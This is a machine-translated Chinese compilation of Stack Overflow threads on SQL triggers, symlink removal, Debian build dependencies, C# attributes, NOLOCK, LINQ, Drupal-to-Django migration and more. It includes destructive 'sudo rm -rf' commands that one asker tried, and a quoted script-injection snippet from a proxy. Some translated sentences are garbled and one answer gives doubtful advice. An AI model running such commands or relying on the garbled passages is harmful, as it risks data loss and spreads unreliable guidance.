查看查询计划以了解它是如何工作的。您将看到触发器中的语句将在每次调用过程时被调用。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-16T20:29:19.107

问题是，每次满足 TRIGGER 标准时，TRIGGER 都会触发。它在批处理或事务中触发一次。请参阅我在 TRIGGER 上的第[101 课](http://dbalink.wordpress.com/2008/06/20/how-to-sql-server-trigger-101/)

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2013-04-09T11:02:35.177

您应该在插入语句中使用游标来处理触发行。因为 SQL Server 中的触发器每条语句触发一次，而不是每行触发一次。

# linux - 删除目录的符号链接

> ID：210120
> 
> 赞同：1153
> 
> 时间：2008-10-16T20:18:22.453
> 
> 标签：linux, file, symlink

我有一个指向重要目录的符号链接。我想摆脱那个符号链接，同时将目录保留在它后面。

我试着`rm`回来了`rm: cannot remove 'foo'`。
我尝试`rmdir`并回来了`rmdir: failed to remove 'foo': Directory not empty`
，然后我进步了`rm -f`，`rm -rf`并且`sudo rm -rf`

然后我去找我的备份。

有没有办法摆脱符号链接而不用把婴儿和洗澡水一起扔掉？

* * *

## 回答 #1

> 赞同：1393
> 
> 时间：2008-10-16T20:22:41.180

```
# this works:
rm foo
# versus this, which doesn't:
rm foo/ 
```

基本上，您需要告诉它删除*文件*，而不是删除*目录*。我相信 和 之间的差异是因为 C 库处理它们的方式不同`rm`而`rmdir`存在的。

无论如何，第一个应该可以工作，而第二个应该抱怨 foo 是一个目录。

如果它不能按上述方式工作，请检查您的权限。您需要对包含目录的写入权限才能删除文件。

* * *

## 回答 #2

> 赞同：851
> 
> 时间：2008-10-16T20:22:33.490

使用“取消链接”命令并确保末尾**没有/**

```
$ unlink mySymLink 
```

> unlink() 从文件系统中删除一个名称。**如果该名称是文件的最后一个链接，并且没有进程打开该文件，则该文件将被删除，并且它正在使用的空间可供重用。** 如果名称是文件的最后一个链接，但任何进程仍然打开该文件，则该文件将一直存在，直到最后一个引用它的文件描述符被关闭。

如果我正确阅读它，我认为这可能会有问题。

> **如果名称引用了符号链接，则删除该链接。**
> 
> 如果名称引用了套接字、fifo 或设备，则删除它的名称，但打开对象的进程可以继续使用它。

[https://linux.die.net/man/2/unlink](https://linux.die.net/man/2/unlink)

* * *

## 回答 #3

> 赞同：20
> 
> 时间：2008-10-16T20:24:24.203

rm 应该删除符号链接。

```
skrall@skrall-desktop:~$ mkdir bar
skrall@skrall-desktop:~$ ln -s bar foo
skrall@skrall-desktop:~$ ls -l foo
lrwxrwxrwx 1 skrall skrall 3 2008-10-16 16:22 foo -> bar
skrall@skrall-desktop:~$ rm foo
skrall@skrall-desktop:~$ ls -l foo
ls: cannot access foo: No such file or directory
skrall@skrall-desktop:~$ ls -l bar
total 0
skrall@skrall-desktop:~$ 
```

* * *

## 回答 #4

> 赞同：18
> 
> 时间：2012-08-21T21:13:21.250

使用`rm symlinkname`但不要在末尾包含正斜杠（不要使用：）`rm symlinkname/`。然后将询问您是否要删除符号链接，`y`回答是。

* * *

## 回答 #5

> 赞同：14
> 
> 时间：2008-10-16T22:29:20.440

假设它实际上是一个符号链接，

```
$ rm -d symlink 
```

它应该可以解决，但由于它不能启用用于另一个不再存在但恰好在这里做正确事情的情况的潜在代码。

* * *

## 回答 #6

> 赞同：8
> 
> 时间：2008-10-16T20:21:00.543

如果 rm 无法删除符号链接，也许您需要查看包含符号链接的目录的权限。要删除目录条目，您需要包含目录的写入权限。

* * *

## 回答 #7

> 赞同：5
> 
> 时间：2008-10-16T20:23:45.687

假设您的设置类似于：`ln -s /mnt/bar ~/foo`，那么您应该可以`rm foo`毫无问题地进行操作。如果不能，请确保您是该文件的所有者`foo`并有权写入/执行该文件。除非您以递归方式进行，否则删除`foo`将不会触及。`bar`

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2014-09-17T19:23:28.723

在 CentOS 上，只需运行`rm linkname`它就会询问“删除符号链接？”。键入`Y`and `Enter`，链接将消失，目录是安全的。

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2018-01-30T08:39:24.020

我在 Windows Server 上运行的 MinGW（实际上是 Git Bash）遇到了这个问题。以上建议似乎都不起作用。最后复制目录以防万一然后删除Windows资源管理器中的软链接，然后删除回收站中的项目。它发出声音，好像它正在删除文件，但没有。不过一定要备份！

* * *

## 回答 #10

> 赞同：3
> 
> 时间：2020-11-03T18:59:20.250

我也有同样的问题。所以我建议试试`unlink <absolute path>`。

例如`unlink ~/<USER>/<SOME OTHER DIRECTORY>/foo`.

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2020-10-10T04:08:00.667

您可以在创建符号链接的文件夹中使用**unlink**

# linux - 在 Debian 或 Ubuntu 下自动获取构建依赖项的 Debian 方式是什么？

> ID：210122
> 
> 赞同：15
> 
> 时间：2008-10-16T20:19:28.550
> 
> 标签：linux, ubuntu, build, debian, dependencies

我最近下载了我想改进的 GTK 应用程序的源代码压缩包。它使用标准`./configure`和`make`构建顺序。

第一次通过，`configure`报告了一堆未满足的构建依赖项，例如`libgnomeui-2.0`. 像往常一样，我必须手动查找`*-dev`与这些依赖项对应的 Debian 软件包名称……当然，这些名称永远不会完全匹配，所以这真的很麻烦。

所以发生在我身上的是......**是否有任何帮助工具来自动安装`automake`/`autoconf`配置文件列出的构建依赖项？？？**

（我已经了解这些`dpkg-buildpackage`工具，但在这种情况下，我有兴趣从原始独立于发行版的源代码 tarball 构建，**而不是**从 Debian 软件包源代码构建。）

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2008-10-16T20:35:28.300

你想要[`auto-apt`](http://packages.debian.org/search?keywords=auto-apt)（[手册页](http://manpages.debian.net/cgi-bin/man.cgi?query=auto-apt&apropos=0&sektion=0&manpath=Debian+Sid&format=html&locale=en)）。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2008-10-16T20:21:01.260

`apt-get build-dep <package>`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-16T20:29:53.863

如果没有编写自己的脚本来为每个包 -dev 进行 apt-cache 搜索，您可能会不走运。

# java - 对于典型的 Web 2.0 社交应用程序 - Java 与 C#

> ID：210123
> 
> 赞同：2
> 
> 时间：2008-10-16T20:20:03.837
> 
> 标签：java, .net, visual-studio

对于长期的产品（可能是 0.5-100 万用户），从成本/盈利能力的角度来看，使用 java 代替 .net 是否更好。要详细说明..考虑网络农场场景，其中一个人必须购买 Windows + Sql 服务器 + 一些用于 .net 应用程序的防病毒许可证。但是对于java来说，它几乎是免费的。我应该考虑哪些方面？

PS：我是一个内心深处的.net人

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-10-16T20:24:14.530

如果您相当成功，我预计带宽的成本将高于软件许可证 - 尽管显然这在一定程度上取决于应用程序的类型，而且我没有运行任何数据。

您是否只是自己开始，几乎没有确定它会起飞？如果是这样，我建议你选择任何让你的生活更容易开始的东西。如果事情进展顺利，您要么有足够的钱轻松支付许可证费用，要么您很可能无论如何都需要重写应用程序。编写一个可扩展至一百万用户的应用程序可能比编写一个可扩展至 10,000 个用户的应用程序更令人痛苦。尽早推出应用程序，尽快获得反馈，如果它真正成功，您可以尽其所能。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-16T20:22:03.367

跟着你知道的走。有了这么多用户，价格可能并不重要。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-16T20:22:47.437

您应该考虑的第一件事是您是 .net 人。Java 语法非常相似，但是你需要花时间来学习（更重要的是，变得足够优秀以编写这么大的应用程序）用你不知道的语言。您应该考虑节省的时间对您来说是否值得。

另外，请记住，有许多（合法）方法可以获得您需要的 Microsoft 软件的廉价（有时是免费）副本，或者您需要的软件的“精简”版本......这可能足以获得你一直到你的企业开始赚钱为止。因此，在做出决定之前也要探索这些。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-16T20:49:12.577

许可费的成本不到一周支付开发团队的费用。

选择你最有效率的东西，你会省钱。

顺便说一句，WebSphere 每个 CPU 的成本为 1600 美元……Java 并不总是免费的。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-10-16T21:02:04.877

If you're a .net person, then stay with c#.net.

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-16T20:58:45.663

Whenever this topic comes up, I'm reminded of the part of yahoo that used to be written in lisp, and used lisp very effectively in its design.

[http://www.algo.be/cl/TEE-lisp/3212824097309629/index.htm](http://www.algo.be/cl/TEE-lisp/3212824097309629/index.htm)

Like others have said, it doesn't matter much what platform you choose, as long as you can use that platform well.

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-10-17T02:51:07.900

If you're talking about purely buying hardware it depends. You could run a Java web app for simply the cost of the machines if you decide to use open source software. However you could go with Oracle as your database and Weblogic as your App Server and then pay for it.

But most importantly, you say yourself you're a .net guy - so you'd have to have the intangible cost of however long it would take you to get to the point where you actually know what you are doing with Java. The syntax is very close, sure, but you have to learn which Java frameworks you want to use, which APIs you want to use, how to deploy to whatever App Server you choose, etc.

Joel wrote about this in [Language Wars](http://www.joelonsoftware.com/items/2006/09/01.html)

> How do you decide between C#, Java, PHP, and Python? The only real difference is which one you know better. If you have a serious Java guru on your team who has build several large systems successfully with Java, you're going to be a hell of a lot more successful with Java than with C#, not because Java is a better language (it's not, but the differences are too minor to matter) but because he knows it better. Etc.

# c# - c# 属性还有其他有用的属性吗？

> ID：210145
> 
> 赞同：6
> 
> 时间：2008-10-16T20:24:49.180
> 
> 标签：c#, properties, attributes

> **可能重复：**
> [C# 中最有用的属性](https://stackoverflow.com/questions/144833/most-useful-attributes-in-c)

除了：

```
[DefaultValue(100)]
[Description("Some descriptive field here")]
public int MyProperty{get; set;} 
```

还有哪些 C# Attributes 对 Properties 有用，在学习了这些之后，我觉得我错过了。

**相关问题**

[C# 中最有用的属性](https://stackoverflow.com/questions/144833/most-useful-attributes-in-c#144929)

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-10-16T20:28:25.117

```
[Obsolete("This is an obsolete property")] 
```

这是我的最爱之一。允许您将属性/方法标记为过时，这将在构建时导致编译器警告（可选地，编译器错误）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-16T21:44:40.343

一些...

同步、内联等：

```
[MethodImpl] 
```

组件型号：

```
[TypeDescriptor], [DisplayName], [Editor] 
```

序列化：

```
[Serializable], [DataMember], [XmlElement], [XmlAttribute], [NonSerialized], etc 
```

声明式安全：

```
[PrincipalPermission] 
```

所有 COM 的东西......

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-16T20:26:59.347

```
[Browsable] 
```

是我的最爱。( [MSDN](http://msdn.microsoft.com/en-us/library/system.componentmodel.browsableattribute.aspx) )

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-10-16T20:33:20.283

很长一段时间以来，我一直想要一个完整的 c# 属性列表，但从未在 MSDN 文档或任何地方找到一个列表。我认为这是他们文档中较弱的部分之一。

如果我想从 xml 序列化中排除一个属性，我使用 [XmlIgnore]。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-10-16T21:14:19.953

如果您在多语言 UI中使用`Description`和，那么您可能会发现基于资源的版本很有用（反映自）：`Category``System.Windows.Forms`

```
[AttributeUsage(AttributeTargets.All)]
internal sealed class SRDescriptionAttribute : DescriptionAttribute
{
    private bool replaced;

    public SRDescriptionAttribute(string description) : base(description)
    {
    }

    public override string Description
    {
        get
        {
            if (!this.replaced)
            {
                this.replaced = true;
                base.DescriptionValue = SR.GetString(base.Description);
            }
            return base.Description;
        }
    }
}

[AttributeUsage(AttributeTargets.All)]
internal sealed class SRCategoryAttribute : CategoryAttribute
{
    public SRCategoryAttribute(string category) : base(category)
    {
    }

    protected override string GetLocalizedString(string value)
    {
        return SR.GetString(value);
    }
} 
```

`SR`适当的包装器在哪里`ResourceManager`。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-10-16T20:27:41.827

[C# 属性属性](https://stackoverflow.com/questions/208703/c-property-attributes)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-10-16T21:43:08.163

我经常在枚举中使用它。枚举中有“默认”或“未知”值，但您不一定希望绑定到控件，例如下拉菜单？添加自定义属性或使用现有属性来表示应该/不应该可见的项目。

我在具有事件代理和策略注入的框架上做了很多工作，而在使用额外的元数据或松散耦合的事件装饰事件时，属性是非常宝贵的。

有一些相当新的工具，例如 PostSharp ( [http://www.postsharp.org/](http://www.postsharp.org/) )，您可以使用它们将行为封装在属性中。该网站上有几个很好的例子；令人惊讶的是，您可以通过这些模式编写代码变得多么简单。. .

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-10-16T21:01:14.847

[Localizable](http://msdn.microsoft.com/en-us/library/system.componentmodel.localizableattribute(VS.71).aspx) 和 [ListBindable](http://msdn.microsoft.com/en-us/library/system.componentmodel.listbindableattribute(VS.71).aspx) 对于自定义组件设计者来说可能很有趣。

# c# - Weird xml c# problem, does Vista cache program files?

> ID：210152
> 
> 赞同：1
> 
> 时间：2008-10-16T20:26:38.113
> 
> 标签：c#, xml

My c# program reads an xml file when it loads, my installer installs the program in %program files%\myapp. When I run my program it loads an old xml file and not the one found in its current folder, here is the weird bit, if I rename the myapp folder to myapp2 and rerun the exe the correct xml file loads. I have made no changes to any of the files within the myapp folder, only the installer knows the actual location of the myapp folder and the installer is very simple. There is no hard coded paths in the code. If I copy the myapp folder to the desktop the correct xml files loads.

What is going on here? Anyone seen something similar? Sorry this is vague I have nothing else to go on.

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-16T20:32:27.197

> does Vista cache program files?

In short: yes ... see this blog post: [Vista Program Files Hide and Seek](http://www.clipboardextender.com/off-topic/vista-program-files-hide-and-seek)

# metrics - 什么是沼泽图？

> ID：210155
> 
> 赞同：5
> 
> 时间：2008-10-16T20:27:35.680
> 
> 标签：metrics, qa, defects

有人告诉我沼泽图，解释说它们通过测量给定产品的传入缺陷和传出修复率来预测代码质量很有用。

不幸的是，我无法找到有关这些图表的其他信息，我想知道这是否是特定于一家公司的行话。

你能解释一下什么是沼泽图吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-10-16T20:58:22.810

您可以在这篇关于“ [CESR 的调试和性能特征](http://epaper.kek.jp/p81/PDF/PAC1981_1984.PDF)”的文章中看到“沼泽图”的示例， pdf 或 p.5 第 5 页。该文件的 1988 年。

^(（CESR 是康奈尔电子存储环，旨在提供高达 16 GeV 质心能量的碰撞电子束和正电子束。）
（显然，我只是从这里的文章中复制内容，我只是一个编码器，而不是物理学家;) ))

现在，沼泽图的有趣之处在于***重新分区比率方面***，您可以轻松地查看两个轴上的数据组（“沼泽”）。

如果您的两个轴是：

*   传入缺陷率和
*   外发修复率

您可以想象修复的本质：当发现大量错误时，修复过程是否有效？
这可以告诉你很多关于发现的缺陷的性质（“很多”或沼泽可以指许多非常容易的错误，因为在大量文件中重复出现愚蠢的错字并且很容易纠正，但其他很多同样重要但修复得非常缓慢可能表明一个结构性问题可能会影响您的应用程序的架构选择：您想专注于那个沼泽）

最后，不，这不是某个公司的内部术语，只是一个旧术语，指的是……给定领土上实际地理沼泽重新分区的旧图表。[（正如 1977 年关于“早期波利尼西亚人对森林的破坏”的](http://books.google.fr/books?pg=RA1-PA279&lpg=RA1-PA279&dq=%22swamp+diagram%22&sig=bBuKQv0avtmclXqic6AYqkWPx0U&ct=result&id=oQ44AAAAIAAJ&ots=ylHC06OYkF&output=html)这篇文章所示，回到几页看那张地图）

* * *

正如 David Segonds 在评论中所说，现代名称将是“***二项式趋势线***”（尽管比率方面在这种图表中往往会有点丢失）。[您可以在此按年龄划分的选民投票率图中](http://www.stat.columbia.edu/~cook/movabletype/archives/statistical_graphics/)
看到一个示例。

沼泽图的另一个现代示例是该图将[每个县显示为椭圆，椭圆的大小与](http://redbluerichpoor.com/blog/?p=83)两次选举中县的人口（更准确地说，选民投票率）成正比。（奇怪的是，似乎只有与这种数据表示相关的政治例子才会出现；）

[免责声明：以下只是一个例子，绝不代表任何政治观点；）]

![http://andrewgelman.com/wp-content/uploads/2008/09/1896c.png](https://i.stack.imgur.com/OdXcz.png)

# .net - Formview Insert 模板在 .NET 2.0 中运行存储过程后，如何捕获 inputoutput 参数值？

> ID：210161
> 
> 赞同：2
> 
> 时间：2008-10-16T20:28:46.317
> 
> 标签：.net, stored-procedures, formview

我有一个 formview，它像往常一样通过表适配器执行插入存储过程。除非插入失败，sp 上名为 error_msg 的输出参数设置为

```
 "Insert failed because XXXX is required". 
```

如何捕获此值并将其打印在用户的屏幕上？我似乎无法找到它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2010-10-15T00:33:36.510

缺少一些详细信息，例如您是否使用`ObjectDataSource`，您正在使用哪个数据库等。

那么这是一个为 SQL Server 检索输出参数的示例。

将数据源绑定到您的 FormView

```
<asp:ObjectDataSource ID="myDataSource" runat="server" 
       InsertCommand="myProcedure" 
       InsertCommandType="StoredProcedure"
       Inserted="myDataSource_Inserted">
  <InsertParameters>
    <asp:Parameter Name="returnValue" Type="String" Direction="InputOuput" />
    <asp:Parameter Name="myField1" Type="Int32" />
    <asp:Parameter Name="myField2" Type="String" />
  </InsertParameters>
</asp:ObjectDataSource> 
```

并在 SQL Server 中创建一个过程：

```
CREATE PROCEDURE myProcedure 
(
   @myField1 int,
   @myField2 varchar(50),
   @returnValue varchar(100) OUT 
)

AS

BEGIN

   INSERT INTO myTable VALUES (@myField1, @myField2)

   IF @@ERROR <> 0 
      SET @returnValue='Insert failed because XXXX is required'
END 
```

对象数据源还有一个事件方法，您可以使用它来检索参数信息：

```
protected void myDataSource_Inserted(object sender, ObjectDataSourceStatusEventArgs e)
{
    string returnValue = Convert.ToString(e.ReturnValue);
    //your code here...
} 
```

# django - 如何从 Drupal 移植到 Django？

> ID：210169
> 
> 赞同：6
> 
> 时间：2008-10-16T20:29:50.930
> 
> 标签：django, drupal

将现有 Drupal 站点移植到 Django 应用程序的最佳方式是什么？我有大约 500 页（主要是书籍模块）和大约 50 篇博客文章。我没有使用任何 3rd 方模块。我想保留当前的 ​​URL（用于 SEO 目的）并将数据库迁移到 Django。我将创建一个简单的博客应用程序，所以迁移博客帖子应该没问题。使用 Django 提供 500 多个页面的最佳方式是什么？我想使用管理员来编辑/添加新页面。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2008-10-16T21:06:12.497

所有的 Django 开发都是相似的，你的将适合这种模式。

1.  为您的书籍和博客文章定义 Django 模型。

2.  使用 Django 的内置测试功能对该模型进行单元测试。

3.  编写一些小实用程序来将您的遗留数据加载到 Django 中。此时，您将意识到您的 Django 模型并不完美。好的。修理它。修复测试。重做负载。

4.  为您的模型配置默认管理界面。此时，您将花时间调整管理界面。你会意识到你的数据模型是错误的。这是一件好事。修复你的模型。修复你的测试。修理你的负载。

5.  现在您的数据是正确的，您可以从旧页面创建模板。

6.  创建 URL 映射和视图函数以从数据模型中填充模板。

花时间让数据模型正确。这真的很重要，因为如果您的数据模型是可靠的，那么其他一切都非常简单。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-18T12:37:09.247

可以编写与遗留数据库一起使用的 Django 模型（我过去曾这样做过；请参阅 文​​档`manage.py inspectdb`）。

但是，我会遵循上面的建议并使用 Django 约定设计一个干净的数据库，然后迁移数据。我通常编写迁移脚本，通过 Django 写入新数据库并使用原始 Python DB API 读取旧的（虽然也可以将 Django[同时绑定到多个数据库](http://groups.google.com/group/django-developers/browse_thread/thread/9f0353fe0682b73)）。

我还建议查看 Django 可用的博客应用程序。如果[Pinax](http://pinaxproject.com/)中包含的那个适合您的需要，请继续使用 Pinax 作为起点。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-10-11T06:43:29.970

[S.Lott 的答案](https://stackoverflow.com/a/210315/892951)多年后仍然有效，我尝试使用工具和格式完成分析以完成这项工作。

现在有很多 Drupal 导出工具，但我也有同样的要求，我选择了 JSON 作为格式的[Views Datasource 。](https://www.drupal.org/project/views_datasource)这个模块非常可靠，可用于 Drupal 的最新版本。[JSON](http://www.json.org/)格式在解析和编码方面都非常快，并且易于阅读且对 Python 非常友好（[import json](https://docs.python.org/2/library/json.html)）。

使用 Views Datasource，您可以创建按节点 id (nid) 排序的节点视图，每页显示有限数量的元素，配置视图路径，向其添加过滤器标识符并将 nid 传递给它以读取所有元素，直到获得一个空的 JSON 响应。

在 Django 中导入时，您也有很多工具，从[loaddata 到 load fixtures](https://docs.djangoproject.com/en/1.8/howto/initial-data/#providing-initial-data-with-fixtures)。查看数据源导出的 JSON，但它的格式不是 Django 期望的固定装置：您可以编写[自定义管理命令](https://docs.djangoproject.com/en/1.8/howto/custom-management-commands/)来执行导入，您可以在其中完全控制导入流程。

您可以通过传递 nid=0 作为参数来启动命令，然后让过程读取、导入然后从下一页获取数据，只需传递上一个 HTTP 请求中读取的最后一个 nid。您甚至可以限制对视图路径的访问，但您需要在导入端进行额外配置。

[关于性能，例如，我在 8 核 / 8 GB Linux 虚拟机和PostgreSQL](http://www.postgresql.org/)作为 DBMS上通过 Django 1.8 自定义管理命令在不到 10 分钟的时间内解析并导入了 15.000 多个节点，将成功和错误信息记录到自定义模型中每个节点。

这些是这两个平台之间导入/导出的基础知识，有关详细信息，我[在本指南中描述了从 Drupal 导出然后导入到 Django 的所有主要步骤](https://chirale.wordpress.com/2015/10/10/guide-to-migrate-a-drupal-website-to-django-after-the-release-of-drupal-8/)。

# sql - SELECT 语句中 NOLOCK 提示的效果

> ID：210171
> 
> 赞同：207
> 
> 时间：2008-10-16T20:30:03.567
> 
> 标签：sql, sql-server, locking

我想真正的问题是：

如果我不关心脏读，将**with (NOLOCK)**提示添加到 SELECT 语句会影响以下性能：

1.  当前的 SELECT 语句
2.  针对给定表的其他事务

例子：

```
Select * 
from aTable with (NOLOCK) 
```

* * *

## 回答 #1

> 赞同：303
> 
> 时间：2008-10-16T20:43:38.640

1)**是**的，选择 with`NOLOCK`将比普通选择更快地完成。

2)**是**的，选择 with`NOLOCK`将允许针对受影响表的其他查询比普通选择更快地完成。

**为什么会这样？**

`NOLOCK`通常（取决于您的数据库引擎）意味着给我您的数据，我不在乎它处于什么状态，并且在您读取它时不要打扰它。它同时速度更快，资源消耗更少，而且非常非常危险。

应该警告您永远不要对系统关键的东西进行更新或执行任何操作，或者使用源自`NOLOCK`读取的数据需要绝对正确性的地方。此数据绝对有可能包含在查询运行期间已删除的行或在尚未完成的其他会话中已删除的行。此数据可能包含已部分更新的行。此数据可能包含违反外键约束的记录。此数据可能会排除已添加到表中但尚未提交的行。

*你真的无法知道数据的状态是什么。*

如果您尝试获取诸如行计数或其他可以接受一些误差范围的汇总数据之类的东西，那么`NOLOCK`这是提高这些查询的性能并避免它们对数据库性能产生负面影响的好方法。

**始终`NOLOCK`非常谨慎地使用提示，并可疑地处理它返回的任何数据。**

* * *

## 回答 #2

> 赞同：62
> 
> 时间：2008-10-16T21:53:05.477

由于缺少共享锁，NOLOCK 使大多数 SELECT 语句更快。此外，没有发布锁意味着写入器不会受到您的 SELECT 的阻碍。

NOLOCK 在功能上等同于 READ UNCOMMITTED 的隔离级别。主要区别在于，如果您愿意，您可以在某些表上使用 NOLOCK，但不能在其他表上使用。如果您计划在复杂查询中对所有表使用 NOLOCK，那么使用 SET TRANSACTION ISOLATION LEVEL READ UNCOMMITTED 会更容易，因为您不必将提示应用于每个表。

以下是有关您可以使用的所有隔离级别的信息，以及表格提示。

[设置事务隔离级别](http://msdn.microsoft.com/en-us/library/ms173763(SQL.90).aspx)

[表提示 (Transact-SQL)](http://msdn.microsoft.com/en-us/library/ms187373(SQL.90).aspx)

* * *

## 回答 #3

> 赞同：14
> 
> 时间：2011-09-08T22:08:46.410

除了上面所说的之外，您应该非常清楚 nolock 实际上会带来您**无法**获得在选择**之前**已提交的行的风险。

请参阅[http://blogs.msdn.com/sqlcat/archive/2007/02/01/previously-committed-rows-might-be-missed-if-nolock-hint-is-used.aspx](http://blogs.msdn.com/sqlcat/archive/2007/02/01/previously-committed-rows-might-be-missed-if-nolock-hint-is-used.aspx)

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2008-10-16T20:32:12.813

它会更快，因为它不必等待锁

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2016-02-05T16:00:08.260

*   如果查询一次运行多次，答案是**肯定的，因为每个事务不需要等待其他事务完成。**但是，如果查询单独运行一次，则答案是否定的。

*   **是**的。仔细使用 WITH(NOLOCK) 很有可能会整体加快数据库速度。这意味着其他事务不必等待此 SELECT 语句完成，但另一方面，其他事务将减慢速度，因为它们现在与新事务共享其处理时间。

请注意**仅**`WITH (NOLOCK)`在具有聚集索引的表上的 SELECT 语句中使用。

WITH(NOLOCK) 通常被用作加速数据库读取事务的神奇方法。

结果集可以包含尚未提交的行，这些行通常稍后会回滚。

如果将 WITH(NOLOCK) 应用于具有非聚集索引的表，则当行数据流式传输到结果表中时，其他事务可以更改行索引。这意味着结果集可能会丢失行或多次显示同一行。

READ COMMITTED 增加了一个额外的问题，即多个用户同时更改同一单元格的单个列中的数据损坏。

# .net - 在 LINQ 中如何找到连接 2 个表的不同项目？

> ID：210178
> 
> 赞同：2
> 
> 时间：2008-10-16T20:31:56.903
> 
> 标签：.net, linq

鉴于下表。如何在 LINQ 中获得另一个 ID 为 76 的 Distinct 名称？

```
**Table S**
SID   OtherID
------------------------------
1     77
2     76

**Table Q**
QID   SID  HighLevelNAme      LoweLevelName
---------------------------------------
10     1       Name1              Engine
11     1       Name1              SparkPlus
12     1       Name2              Seat
13     1       Name2              Belt
14     1       Name1              Oil 
```

我想返回一个列表

名称 1 名称 2

执行此操作的 SQL 是

```
SELECT DISTINCT
    Q.HighLevelNAme
FROM S
JOIN Q ON Q.SID = S.SID
WHERE
        S.OtherID = 76 
```

我也有代表每个表的对象。

VB 或 C# 中的答案是可以接受的。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-10-16T20:40:36.387

如果您在数据库中定义了外键关系，并通过设计器生成了 LINQ 类，那么连接应该在对象模型中表示，对吗？那么每个 QItem 都有一个属性 SItem？如果没有，我想您可以使用 Join 扩展方法来处理该部分。

无论如何，我没有测试这个 IRL，但它不会只是这个吗？

```
var results = (from QItem in dataContext.QItems
                where QItem.SItem.OtherID == 76
                select QItem.HighLevelName).Distinct(); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-16T21:07:48.187

使用 Troy 的答案，这种查询方法也有效。

```
List<string> highLevelNames = dataContext
  .Q
  .Where<Q>(item => item.S.OtherID == id)
  .Select<Q, string>(item => item.HighLevelNAme)
  .Distinct()
  .ToList<string>(); 
```

# javascript - 为什么这么多网页的标题中包含如此奇怪的代码片段？

> ID：210180
> 
> 赞同：4
> 
> 时间：2008-10-16T20:32:26.683
> 
> 标签：javascript, html, virus

很长一段时间以来，我的firefox状态栏中不时出现jsev.com、cssxx.com等奇怪的域，我一直想知道为什么这么多网页包含来自这些奇怪域的资源。我用谷歌搜索，但一无所获。我猜这是某种感染服务器并插入代码的病毒。[以下是从http://www.eflorenzano.com/threadexample/blog/](http://www.eflorenzano.com/threadexample/blog/)的页眉中获取的示例：

```
<script language="javascript" src="http://i.jsev.com./base.2032621946.js"> </script>
<body onmousemove="return fz3824();">
<LINK REL="stylesheet" TYPE="text/css" HREF="http://i.cssxx.com./base2032621947.css">
<A HREF = "http://i.html.com./base2032621947.html"></A>
<SCRIPT LANGUAGE="JAVASCRIPT" SRC="http://i.js.com./base2032621947.js"></SCRIPT>
<SCRIPT LANGUAGE="JAVASCRIPT">
function getuseragnt()
{ var agt = navigator.userAgent.toLowerCase();
  agt = agt.replace(/ /g, "");
  return agt;
}
document.write("<LINK REL='stylesheet' TYPE='text/css' HREF='http://i.css2js.com./base.css" + getuseragnt() + "_2032621947'>") 
</SCRIPT> 
```

编辑：我在一个debian盒子上，只有在firefox上才看到这个代码，我刚试了opera，这个代码没有出现在opera中，真的很奇怪，从来没有听说过firefox有这样的问题。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-03-08T09:29:57.260

如果您使用的是普林斯顿大学的 CoDeeN 项目代理服务器之一，就会发生这种情况。CoDeeN 是一个学术测试平台内容分发网络。当您使用 CoDeeN 代理浏览网页时，它会向网站的原始 HTML 注入一些 HTML 代码，并将发送到伪地址的请求重定向到项目的服务器。一些伪地址是：http: [//i.cssxx.com./base0877861956.css](http://i.cssxx.com./base0877861956.css) | i.cssxx.com。 [http://i.jsev.com./base.0877861955.js](http://i.jsev.com./base.0877861955.js) | i.jsev.com./ [http://i.html.com./base0877861956.html](http://i.html.com./base0877861956.html) | i.html.com。 [http://i.js.com./base0877861956.js](http://i.js.com./base0877861956.js) | i.js.com./ [http://i.css2js.com./base.css](http://i.css2js.com./base.css) | i.css2js.com。

部分或全部 CoDeeN 的代理服务器显示为匿名代理服务器列表。CoDeeN 项目页面：[http ://codeen.cs.princeton.edu/](http://codeen.cs.princeton.edu/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-16T20:38:45.780

它可能是您机器上安装的浏览器蠕虫。应该扫描整个系统。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-16T20:39:43.127

我看不出那个页面有什么不寻常的地方。检查您的系统。这是我收到的代码：

```
<head><title>Tutorial 2</title>
<link rel="stylesheet" type="text/css" href="http://yui.yahooapis.com/2.4.1/build/reset/reset-min.css">
<link rel="stylesheet" type="text/css" href="http://media.eflorenzano.com/css/example2.css">
<script type="text/javascript" src="http://media.eflorenzano.com/js/jquery-1.2.2.min.js"></script>
<script type="text/javascript" src="http://media.eflorenzano.com/js/jquery.form.js"></script>

<script type="text/javascript">
    var _POSTER = '';
    var _FORM = '<textarea id="id_comment" rows="10" cols="40" name="comment"></textarea>';
